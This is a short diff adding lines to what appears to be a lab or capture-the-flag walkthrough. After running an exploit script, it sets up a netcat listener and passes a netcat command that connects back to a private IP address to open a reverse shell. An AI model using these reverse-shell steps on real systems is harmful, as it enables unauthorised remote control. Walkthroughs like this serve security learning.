@@ -64,6 +64,18 @@ chmod +x 47138.py
 python 47138.py
 ```
 
+![image](https://user-images.githubusercontent.com/90561566/188256466-ef67f34d-b02c-421e-b8f1-f15a6393e4a9.png)
+
+now we open a reverse shell to control easily
+
+```
+nc -vlnp 1234
+```
+
+```
+cmd: nc 192.168.211.137 1234
+```
+
 
 
 .
